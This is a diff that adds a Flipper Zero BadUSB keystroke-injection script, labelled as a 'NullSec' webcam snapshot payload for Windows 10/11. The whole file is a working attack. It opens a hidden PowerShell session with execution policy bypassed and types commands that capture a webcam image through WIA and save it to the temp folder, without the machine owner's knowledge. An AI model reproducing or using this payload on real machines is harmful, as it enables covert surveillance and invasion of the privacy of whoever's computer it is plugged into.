@@ -1,0 +1,25 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Webcam Snapshot
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING [Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
+ENTER
+STRING $webcam = New-Object -ComObject WIA.CommonDialog
+ENTER
+STRING $device = $webcam.ShowSelectDevice()
+ENTER
+STRING $img = $device.Items[1].Transfer()
+ENTER
+STRING $img.SaveFile("$env:TEMP\webcam.jpg")
+ENTER
+STRING exit
+ENTER
